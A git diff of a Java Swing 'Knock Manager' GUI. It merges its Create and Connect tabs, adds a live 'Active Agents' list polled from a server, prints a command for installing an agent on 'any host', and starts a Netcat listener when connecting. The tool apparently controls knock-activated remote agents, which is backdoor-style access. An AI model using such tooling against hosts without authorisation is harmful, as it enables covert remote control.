@@ -8,6 +8,7 @@ package manager;
 import java.io.IOException;
 import java.util.logging.Level;
 import java.util.logging.Logger;
+import javax.swing.DefaultListModel;
 import javax.swing.JFileChooser;
 
 /**
@@ -15,12 +16,15 @@ import javax.swing.JFileChooser;
  * @author jamin
  */
 public class GUI extends javax.swing.JFrame {
-
     /**
      * Creates new form GUI
      */
+    private Globals globals = new Globals();
+    
     public GUI() {
+        
         initComponents();
+        activeUpdater();
     }
 
     /**
@@ -32,9 +36,10 @@ public class GUI extends javax.swing.JFrame {
     // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
     private void initComponents() {
 
-        createKnockPane = new javax.swing.JTabbedPane();
-        createKnockTab = new javax.swing.JPanel();
+        knockPane = new javax.swing.JTabbedPane();
+        controlKnockTab = new javax.swing.JPanel();
         createButton = new javax.swing.JButton();
+        connectButton = new javax.swing.JButton();
         serverIpText = new javax.swing.JTextField();
         portText = new javax.swing.JTextField();
         knockText = new javax.swing.JTextField();
@@ -43,16 +48,8 @@ public class GUI extends javax.swing.JFrame {
         lowerSeparator = new javax.swing.JSeparator();
         lowerScrollPanel = new javax.swing.JScrollPane();
         outputPane = new javax.swing.JTextArea();
-        connectKnockTab = new javax.swing.JPanel();
-        knockText2 = new javax.swing.JTextField();
-        connectButton = new javax.swing.JButton();
-        lowerScrollPanel2 = new javax.swing.JScrollPane();
-        outputPane2 = new javax.swing.JTextArea();
-        lowerSeparator2 = new javax.swing.JSeparator();
-        upperSeparator1 = new javax.swing.JSeparator();
-        serverIpText2 = new javax.swing.JTextField();
-        portText2 = new javax.swing.JTextField();
-        colonLabel1 = new javax.swing.JLabel();
+        activeAgentsPane1 = new javax.swing.JScrollPane();
+        activeAgentsList = new javax.swing.JList();
         configTab = new javax.swing.JPanel();
         scriptDirText = new javax.swing.JTextField();
         browseScriptDir = new javax.swing.JButton();
@@ -61,22 +58,32 @@ public class GUI extends javax.swing.JFrame {
         setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
         setTitle("Knock Manager");
 
-        createKnockPane.setBackground(new java.awt.Color(0, 0, 0));
-        createKnockPane.setBorder(new javax.swing.border.SoftBevelBorder(javax.swing.border.BevelBorder.RAISED));
-        createKnockPane.setForeground(new java.awt.Color(204, 204, 204));
-        createKnockPane.setFocusable(false);
-        createKnockPane.setFont(new java.awt.Font("Ubuntu", 1, 12)); // NOI18N
-        createKnockPane.setInheritsPopupMenu(true);
+        knockPane.setBackground(new java.awt.Color(0, 0, 0));
+        knockPane.setBorder(new javax.swing.border.SoftBevelBorder(javax.swing.border.BevelBorder.RAISED));
+        knockPane.setForeground(new java.awt.Color(204, 204, 204));
+        knockPane.setFocusable(false);
+        knockPane.setFont(new java.awt.Font("Ubuntu", 1, 12)); // NOI18N
+        knockPane.setInheritsPopupMenu(true);
 
-        createKnockTab.setBackground(new java.awt.Color(204, 204, 204));
+        controlKnockTab.setBackground(new java.awt.Color(204, 204, 204));
 
         createButton.setBackground(new java.awt.Color(102, 102, 102));
         createButton.setFont(new java.awt.Font("Ubuntu", 1, 18)); // NOI18N
-        createButton.setForeground(new java.awt.Color(0, 0, 204));
+        createButton.setForeground(new java.awt.Color(0, 0, 0));
         createButton.setText("Create");
         createButton.addActionListener(new java.awt.event.ActionListener() {
             public void actionPerformed(java.awt.event.ActionEvent evt) {
                 createButtonActionPerformed(evt);
+            }
+        });
+
+        connectButton.setBackground(new java.awt.Color(102, 102, 102));
+        connectButton.setFont(new java.awt.Font("Ubuntu", 1, 18)); // NOI18N
+        connectButton.setForeground(new java.awt.Color(0, 0, 0));
+        connectButton.setText("Connect");
+        connectButton.addActionListener(new java.awt.event.ActionListener() {
+            public void actionPerformed(java.awt.event.ActionEvent evt) {
+                connectButtonActionPerformed(evt);
             }
         });
 
@@ -104,152 +111,85 @@ public class GUI extends javax.swing.JFrame {
         outputPane.setBorder(javax.swing.BorderFactory.createTitledBorder(null, "Server Message", javax.swing.border.TitledBorder.CENTER, javax.swing.border.TitledBorder.DEFAULT_POSITION, new java.awt.Font("Ubuntu", 0, 10))); // NOI18N
         lowerScrollPanel.setViewportView(outputPane);
 
-        javax.swing.GroupLayout createKnockTabLayout = new javax.swing.GroupLayout(createKnockTab);
-        createKnockTab.setLayout(createKnockTabLayout);
-        createKnockTabLayout.setHorizontalGroup(
-            createKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-            .addGroup(createKnockTabLayout.createSequentialGroup()
-                .addGap(207, 207, 207)
-                .addComponent(createButton, javax.swing.GroupLayout.PREFERRED_SIZE, 197, javax.swing.GroupLayout.PREFERRED_SIZE)
-                .addContainerGap(210, Short.MAX_VALUE))
-            .addGroup(createKnockTabLayout.createSequentialGroup()
+        activeAgentsPane1.setBorder(javax.swing.BorderFactory.createTitledBorder(new javax.swing.border.SoftBevelBorder(javax.swing.border.BevelBorder.RAISED), "Active Agents", javax.swing.border.TitledBorder.DEFAULT_JUSTIFICATION, javax.swing.border.TitledBorder.DEFAULT_POSITION, new java.awt.Font("Ubuntu", 0, 10))); // NOI18N
+
+        activeAgentsList.setFont(new java.awt.Font("Ubuntu", 1, 12)); // NOI18N
+        activeAgentsList.addListSelectionListener(new javax.swing.event.ListSelectionListener() {
+            public void valueChanged(javax.swing.event.ListSelectionEvent evt) {
+                activeAgentsListValueChanged(evt);
+            }
+        });
+        activeAgentsPane1.setViewportView(activeAgentsList);
+
+        javax.swing.GroupLayout controlKnockTabLayout = new javax.swing.GroupLayout(controlKnockTab);
+        controlKnockTab.setLayout(controlKnockTabLayout);
+        controlKnockTabLayout.setHorizontalGroup(
+            controlKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
+            .addGroup(controlKnockTabLayout.createSequentialGroup()
                 .addContainerGap()
-                .addGroup(createKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-                    .addComponent(lowerScrollPanel, javax.swing.GroupLayout.Alignment.TRAILING)
-                    .addComponent(lowerSeparator)
-                    .addComponent(knockText)
-                    .addGroup(createKnockTabLayout.createSequentialGroup()
-                        .addGap(76, 76, 76)
-                        .addComponent(serverIpText, javax.swing.GroupLayout.PREFERRED_SIZE, 244, javax.swing.GroupLayout.PREFERRED_SIZE)
-                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
-                        .addComponent(colonLabel)
-                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
-                        .addComponent(portText, javax.swing.GroupLayout.PREFERRED_SIZE, 73, javax.swing.GroupLayout.PREFERRED_SIZE)
-                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
-                    .addComponent(upperSeparator, javax.swing.GroupLayout.Alignment.TRAILING))
+                .addGroup(controlKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
+                    .addComponent(lowerScrollPanel)
+                    .addGroup(controlKnockTabLayout.createSequentialGroup()
+                        .addGroup(controlKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
+                            .addGroup(controlKnockTabLayout.createSequentialGroup()
+                                .addComponent(serverIpText, javax.swing.GroupLayout.PREFERRED_SIZE, 244, javax.swing.GroupLayout.PREFERRED_SIZE)
+                                .addGap(3, 3, 3)
+                                .addComponent(colonLabel)
+                                .addGap(18, 18, 18)
+                                .addComponent(portText, javax.swing.GroupLayout.PREFERRED_SIZE, 73, javax.swing.GroupLayout.PREFERRED_SIZE))
+                            .addGroup(controlKnockTabLayout.createSequentialGroup()
+                                .addComponent(upperSeparator, javax.swing.GroupLayout.DEFAULT_SIZE, 344, Short.MAX_VALUE)
+                                .addGap(7, 7, 7))
+                            .addGroup(controlKnockTabLayout.createSequentialGroup()
+                                .addGroup(controlKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
+                                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, controlKnockTabLayout.createSequentialGroup()
+                                        .addGap(12, 12, 12)
+                                        .addComponent(createButton, javax.swing.GroupLayout.PREFERRED_SIZE, 122, javax.swing.GroupLayout.PREFERRED_SIZE)
+                                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 79, Short.MAX_VALUE)
+                                        .addComponent(connectButton, javax.swing.GroupLayout.PREFERRED_SIZE, 120, javax.swing.GroupLayout.PREFERRED_SIZE)
+                                        .addGap(14, 14, 14))
+                                    .addComponent(lowerSeparator, javax.swing.GroupLayout.Alignment.LEADING)
+                                    .addComponent(knockText, javax.swing.GroupLayout.Alignment.LEADING))
+                                .addGap(4, 4, 4)))
+                        .addComponent(activeAgentsPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 239, Short.MAX_VALUE)))
                 .addContainerGap())
         );
-        createKnockTabLayout.setVerticalGroup(
-            createKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-            .addGroup(createKnockTabLayout.createSequentialGroup()
-                .addGap(42, 42, 42)
-                .addGroup(createKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
-                    .addComponent(serverIpText, javax.swing.GroupLayout.PREFERRED_SIZE, 61, javax.swing.GroupLayout.PREFERRED_SIZE)
-                    .addComponent(portText, javax.swing.GroupLayout.PREFERRED_SIZE, 61, javax.swing.GroupLayout.PREFERRED_SIZE)
-                    .addComponent(colonLabel))
-                .addGap(3, 3, 3)
-                .addComponent(upperSeparator, javax.swing.GroupLayout.PREFERRED_SIZE, 16, javax.swing.GroupLayout.PREFERRED_SIZE)
-                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
-                .addComponent(knockText, javax.swing.GroupLayout.PREFERRED_SIZE, 57, javax.swing.GroupLayout.PREFERRED_SIZE)
-                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
-                .addComponent(createButton, javax.swing.GroupLayout.PREFERRED_SIZE, 31, javax.swing.GroupLayout.PREFERRED_SIZE)
-                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
-                .addComponent(lowerSeparator, javax.swing.GroupLayout.PREFERRED_SIZE, 10, javax.swing.GroupLayout.PREFERRED_SIZE)
-                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
+        controlKnockTabLayout.setVerticalGroup(
+            controlKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
+            .addGroup(controlKnockTabLayout.createSequentialGroup()
+                .addGroup(controlKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
+                    .addGroup(javax.swing.GroupLayout.Alignment.LEADING, controlKnockTabLayout.createSequentialGroup()
+                        .addGap(42, 42, 42)
+                        .addGroup(controlKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
+                            .addComponent(serverIpText, javax.swing.GroupLayout.PREFERRED_SIZE, 61, javax.swing.GroupLayout.PREFERRED_SIZE)
+                            .addComponent(portText, javax.swing.GroupLayout.PREFERRED_SIZE, 61, javax.swing.GroupLayout.PREFERRED_SIZE)
+                            .addComponent(colonLabel))
+                        .addGap(3, 3, 3)
+                        .addComponent(upperSeparator, javax.swing.GroupLayout.PREFERRED_SIZE, 16, javax.swing.GroupLayout.PREFERRED_SIZE)
+                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
+                        .addComponent(knockText, javax.swing.GroupLayout.PREFERRED_SIZE, 63, javax.swing.GroupLayout.PREFERRED_SIZE)
+                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
+                        .addGroup(controlKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
+                            .addComponent(connectButton)
+                            .addComponent(createButton))
+                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
+                        .addComponent(lowerSeparator, javax.swing.GroupLayout.PREFERRED_SIZE, 10, javax.swing.GroupLayout.PREFERRED_SIZE)
+                        .addGap(0, 0, Short.MAX_VALUE))
+                    .addGroup(controlKnockTabLayout.createSequentialGroup()
+                        .addGap(22, 22, 22)
+                        .addComponent(activeAgentsPane1)))
+                .addGap(12, 12, 12)
                 .addComponent(lowerScrollPanel, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
         );
 
-        createKnockPane.addTab("Create", createKnockTab);
-
-        connectKnockTab.setBackground(new java.awt.Color(204, 204, 204));
-
-        knockText2.setBackground(new java.awt.Color(204, 204, 204));
-        knockText2.setFont(new java.awt.Font("Ubuntu", 1, 18)); // NOI18N
-        knockText2.setBorder(javax.swing.BorderFactory.createTitledBorder(null, "Secret Knock", javax.swing.border.TitledBorder.CENTER, javax.swing.border.TitledBorder.DEFAULT_POSITION, new java.awt.Font("Ubuntu", 0, 10))); // NOI18N
-        knockText2.setCursor(new java.awt.Cursor(java.awt.Cursor.TEXT_CURSOR));
-        knockText2.addActionListener(new java.awt.event.ActionListener() {
-            public void actionPerformed(java.awt.event.ActionEvent evt) {
-                knockText2ActionPerformed(evt);
-            }
-        });
-
-        connectButton.setBackground(new java.awt.Color(102, 102, 102));
-        connectButton.setFont(new java.awt.Font("Ubuntu", 1, 18)); // NOI18N
-        connectButton.setForeground(new java.awt.Color(0, 0, 204));
-        connectButton.setText("Connect");
-        connectButton.addActionListener(new java.awt.event.ActionListener() {
-            public void actionPerformed(java.awt.event.ActionEvent evt) {
-                connectButtonActionPerformed(evt);
-            }
-        });
-
-        outputPane2.setBackground(new java.awt.Color(204, 204, 204));
-        outputPane2.setColumns(20);
-        outputPane2.setFont(new java.awt.Font("Ubuntu", 0, 14)); // NOI18N
-        outputPane2.setRows(5);
-        outputPane2.setBorder(javax.swing.BorderFactory.createTitledBorder(null, "Server Message", javax.swing.border.TitledBorder.CENTER, javax.swing.border.TitledBorder.DEFAULT_POSITION, new java.awt.Font("Ubuntu", 0, 10))); // NOI18N
-        lowerScrollPanel2.setViewportView(outputPane2);
-
-        serverIpText2.setBackground(new java.awt.Color(204, 204, 204));
-        serverIpText2.setFont(new java.awt.Font("Ubuntu", 1, 18)); // NOI18N
-        serverIpText2.setBorder(javax.swing.BorderFactory.createTitledBorder(null, "Server IP", javax.swing.border.TitledBorder.DEFAULT_JUSTIFICATION, javax.swing.border.TitledBorder.DEFAULT_POSITION, new java.awt.Font("Ubuntu", 0, 10))); // NOI18N
-
-        portText2.setBackground(new java.awt.Color(204, 204, 204));
-        portText2.setFont(new java.awt.Font("Ubuntu", 1, 18)); // NOI18N
-        portText2.setText("9001");
-        portText2.setBorder(javax.swing.BorderFactory.createTitledBorder(null, "Port", javax.swing.border.TitledBorder.DEFAULT_JUSTIFICATION, javax.swing.border.TitledBorder.DEFAULT_POSITION, new java.awt.Font("Ubuntu", 0, 10))); // NOI18N
-
-        colonLabel1.setFont(new java.awt.Font("Dialog", 1, 24)); // NOI18N
-        colonLabel1.setText(":");
-
-        javax.swing.GroupLayout connectKnockTabLayout = new javax.swing.GroupLayout(connectKnockTab);
-        connectKnockTab.setLayout(connectKnockTabLayout);
-        connectKnockTabLayout.setHorizontalGroup(
-            connectKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-            .addGroup(connectKnockTabLayout.createSequentialGroup()
-                .addContainerGap()
-                .addComponent(lowerScrollPanel2))
-            .addGroup(connectKnockTabLayout.createSequentialGroup()
-                .addGroup(connectKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-                    .addGroup(connectKnockTabLayout.createSequentialGroup()
-                        .addContainerGap()
-                        .addGroup(connectKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-                            .addComponent(lowerSeparator2, javax.swing.GroupLayout.Alignment.TRAILING)
-                            .addComponent(knockText2, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 590, Short.MAX_VALUE)
-                            .addComponent(upperSeparator1)))
-                    .addGroup(connectKnockTabLayout.createSequentialGroup()
-                        .addGroup(connectKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-                            .addGroup(connectKnockTabLayout.createSequentialGroup()
-                                .addGap(206, 206, 206)
-                                .addComponent(connectButton, javax.swing.GroupLayout.PREFERRED_SIZE, 197, javax.swing.GroupLayout.PREFERRED_SIZE))
-                            .addGroup(connectKnockTabLayout.createSequentialGroup()
-                                .addGap(74, 74, 74)
-                                .addComponent(serverIpText2, javax.swing.GroupLayout.PREFERRED_SIZE, 244, javax.swing.GroupLayout.PREFERRED_SIZE)
-                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
-                                .addComponent(colonLabel1)
-                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
-                                .addComponent(portText2, javax.swing.GroupLayout.PREFERRED_SIZE, 76, javax.swing.GroupLayout.PREFERRED_SIZE)))
-                        .addGap(0, 0, Short.MAX_VALUE)))
-                .addContainerGap())
-        );
-        connectKnockTabLayout.setVerticalGroup(
-            connectKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-            .addGroup(connectKnockTabLayout.createSequentialGroup()
-                .addContainerGap(42, Short.MAX_VALUE)
-                .addGroup(connectKnockTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
-                    .addComponent(colonLabel1)
-                    .addComponent(portText2, javax.swing.GroupLayout.PREFERRED_SIZE, 62, javax.swing.GroupLayout.PREFERRED_SIZE)
-                    .addComponent(serverIpText2, javax.swing.GroupLayout.PREFERRED_SIZE, 62, javax.swing.GroupLayout.PREFERRED_SIZE))
-                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
-                .addComponent(upperSeparator1, javax.swing.GroupLayout.PREFERRED_SIZE, 10, javax.swing.GroupLayout.PREFERRED_SIZE)
-                .addGap(12, 12, 12)
-                .addComponent(knockText2, javax.swing.GroupLayout.PREFERRED_SIZE, 57, javax.swing.GroupLayout.PREFERRED_SIZE)
-                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
-                .addComponent(connectButton, javax.swing.GroupLayout.PREFERRED_SIZE, 31, javax.swing.GroupLayout.PREFERRED_SIZE)
-                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
-                .addComponent(lowerSeparator2, javax.swing.GroupLayout.PREFERRED_SIZE, 10, javax.swing.GroupLayout.PREFERRED_SIZE)
-                .addGap(8, 8, 8)
-                .addComponent(lowerScrollPanel2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
-        );
-
-        createKnockPane.addTab("Connect", connectKnockTab);
+        knockPane.addTab("Control", controlKnockTab);
 
         configTab.setBackground(new java.awt.Color(204, 204, 204));
 
         scriptDirText.setBackground(new java.awt.Color(204, 204, 204));
         scriptDirText.setFont(new java.awt.Font("Ubuntu", 0, 14)); // NOI18N
         scriptDirText.setBorder(javax.swing.BorderFactory.createTitledBorder(null, "Script Directory", javax.swing.border.TitledBorder.DEFAULT_JUSTIFICATION, javax.swing.border.TitledBorder.DEFAULT_POSITION, new java.awt.Font("Ubuntu", 0, 10))); // NOI18N
-        scriptDirText.setText(new Globals().scriptDir);
+        scriptDirText.setText(globals.scriptDir);
 
         browseScriptDir.setBackground(new java.awt.Color(153, 153, 153));
         browseScriptDir.setFont(new java.awt.Font("Ubuntu", 1, 18)); // NOI18N
@@ -292,57 +232,30 @@ public class GUI extends javax.swing.JFrame {
                 .addGroup(configTabLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                     .addComponent(scriptDirText, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                     .addComponent(browseScriptDir))
-                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 248, Short.MAX_VALUE)
+                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 254, Short.MAX_VALUE)
                 .addComponent(applyButton, javax.swing.GroupLayout.PREFERRED_SIZE, 31, javax.swing.GroupLayout.PREFERRED_SIZE)
                 .addContainerGap())
         );
 
-        createKnockPane.addTab("Config", configTab);
+        knockPane.addTab("Config", configTab);
 
         javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
         getContentPane().setLayout(layout);
         layout.setHorizontalGroup(
             layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-            .addComponent(createKnockPane, javax.swing.GroupLayout.Alignment.TRAILING)
+            .addComponent(knockPane, javax.swing.GroupLayout.Alignment.TRAILING)
         );
         layout.setVerticalGroup(
             layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-            .addComponent(createKnockPane)
+            .addComponent(knockPane)
         );
 
         pack();
     }// </editor-fold>//GEN-END:initComponents
 
-    private void createButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_createButtonActionPerformed
-        String result = new Client(serverIpText.getText().trim(), Integer.parseInt(portText.getText())).createKnock(knockText.getText());
-        String output;
-        if (result.charAt(1) == '0'){
-            String extraMessage = "\nInstall the agent on any host using: " + " agent.py -i " + serverIpText.getText().trim() + " -p " + portText.getText().trim() + " -k \"" + knockText.getText() +"\"";
-            output = serverIpText.getText().trim() + ": " + result + extraMessage;
-        }
-        else{
-            output = serverIpText.getText().trim() + ": " + result;
-        }
-        outputPane.setText(output);
-        
-    }//GEN-LAST:event_createButtonActionPerformed
-
-    private void knockText2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_knockText2ActionPerformed
-        // TODO add your handling code here:
-    }//GEN-LAST:event_knockText2ActionPerformed
-
-    private void connectButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_connectButtonActionPerformed
-        String result = new Client(serverIpText2.getText().trim(), Integer.parseInt(portText2.getText())).updateKnock(knockText2.getText(), "connect");
-        outputPane2.setText(result);
-        try {
-            new Netcat().startLinux();
-        } catch (IOException ex) {
-            Logger.getLogger(GUI.class.getName()).log(Level.SEVERE, null, ex);
-        } catch (InterruptedException ex) {
-            Logger.getLogger(GUI.class.getName()).log(Level.SEVERE, null, ex);
-        }
-        
-    }//GEN-LAST:event_connectButtonActionPerformed
+    private void applyButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_applyButtonActionPerformed
+        new Globals().setScriptDirectory(scriptDirText.getText() + "/");
+    }//GEN-LAST:event_applyButtonActionPerformed
 
     private void browseScriptDirActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_browseScriptDirActionPerformed
         final JFileChooser fc = new JFileChooser();
@@ -353,10 +266,69 @@ public class GUI extends javax.swing.JFrame {
         }
     }//GEN-LAST:event_browseScriptDirActionPerformed
 
-    private void applyButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_applyButtonActionPerformed
-        new Globals().setScriptDirectory(scriptDirText.getText() + "/");
-    }//GEN-LAST:event_applyButtonActionPerformed
+    private void createButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_createButtonActionPerformed
+        String result = new Client(serverIpText.getText().trim(), Integer.parseInt(portText.getText())).createKnock(knockText.getText());
+        String output;
+        Globals.serverIP = serverIpText.getText().trim();
+        Globals.serverPort = Integer.parseInt(portText.getText());
+        if (result.charAt(1) == '0'){
+            String extraMessage = "\nInstall the agent on any host using: " + " agent.py -i " + serverIpText.getText().trim() + " -p " + portText.getText().trim() + " -k \"" + knockText.getText() +"\"";
+            output = serverIpText.getText().trim() + ": " + result + extraMessage;
+        }
+        else{
+            output = serverIpText.getText().trim() + ": " + result;
+        }
+        outputPane.setText(output);
+    }//GEN-LAST:event_createButtonActionPerformed
 
+    private void connectButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_connectButtonActionPerformed
+        String result = new Client(serverIpText.getText().trim(), Integer.parseInt(portText.getText())).updateKnock(knockText.getText(), "connect");
+        outputPane.setText(result);
+        Globals.serverIP = serverIpText.getText().trim();
+        Globals.serverPort = Integer.parseInt(portText.getText());
+        try {
+            if(!knockText.getText().equals("")){
+                new Netcat().startLinux();
+            }
+            } catch (IOException ex) {
+                Logger.getLogger(GUI.class.getName()).log(Level.SEVERE, null, ex);
+            } catch (InterruptedException ex) {
+                Logger.getLogger(GUI.class.getName()).log(Level.SEVERE, null, ex);
+            }
+    }//GEN-LAST:event_connectButtonActionPerformed
+
+    private void activeAgentsListValueChanged(javax.swing.event.ListSelectionEvent evt) {//GEN-FIRST:event_activeAgentsListValueChanged
+        try{
+            knockText.setText(activeAgentsList.getSelectedValue().toString());
+        }catch(Exception e){
+            System.out.println("Patched...");
+        }
+    }//GEN-LAST:event_activeAgentsListValueChanged
+
+    private void activeUpdater(){
+        new Thread(new Runnable(){
+            public void run() {
+                String result;
+                String[] activeKnocks;
+                while(true){
+                    DefaultListModel activeAgentListModel = new DefaultListModel();
+                    result = new ActiveUpdater().start(Globals.serverIP, Globals.serverPort);
+                    if (!result.equals("Could not connect to server.")){
+                        activeKnocks = result.substring(4).replace("'", "").replace("\"", "").replace(")", "").replace("[", "").replace("]", "").split(",");
+                        for(int i = 0; i < activeKnocks.length; i++){
+                            activeAgentListModel.addElement(activeKnocks[i].trim());
+                        }
+                        activeAgentsList.setModel(activeAgentListModel);
+                    }
+                    try {
+                        Thread.sleep(2000);
+                    } catch (InterruptedException ex) {
+                        Logger.getLogger(GUI.class.getName()).log(Level.SEVERE, null, ex);
+                    }
+                }
+            }
+        }).start();
+    }
     /**
      * @param args the command line arguments
      */
@@ -393,30 +365,23 @@ public class GUI extends javax.swing.JFrame {
     }
 
     // Variables declaration - do not modify//GEN-BEGIN:variables
+    private javax.swing.JList activeAgentsList;
+    private javax.swing.JScrollPane activeAgentsPane1;
     private javax.swing.JButton applyButton;
     private javax.swing.JButton browseScriptDir;
     private javax.swing.JLabel colonLabel;
-    private javax.swing.JLabel colonLabel1;
     private javax.swing.JPanel configTab;
     private javax.swing.JButton connectButton;
-    private javax.swing.JPanel connectKnockTab;
+    private javax.swing.JPanel controlKnockTab;
     private javax.swing.JButton createButton;
-    private javax.swing.JTabbedPane createKnockPane;
-    private javax.swing.JPanel createKnockTab;
+    private javax.swing.JTabbedPane knockPane;
     private javax.swing.JTextField knockText;
-    private javax.swing.JTextField knockText2;
     private javax.swing.JScrollPane lowerScrollPanel;
-    private javax.swing.JScrollPane lowerScrollPanel2;
     private javax.swing.JSeparator lowerSeparator;
-    private javax.swing.JSeparator lowerSeparator2;
     private javax.swing.JTextArea outputPane;
-    private javax.swing.JTextArea outputPane2;
     private javax.swing.JTextField portText;
-    private javax.swing.JTextField portText2;
     private javax.swing.JTextField scriptDirText;
     private javax.swing.JTextField serverIpText;
-    private javax.swing.JTextField serverIpText2;
     private javax.swing.JSeparator upperSeparator;
-    private javax.swing.JSeparator upperSeparator1;
     // End of variables declaration//GEN-END:variables
 }
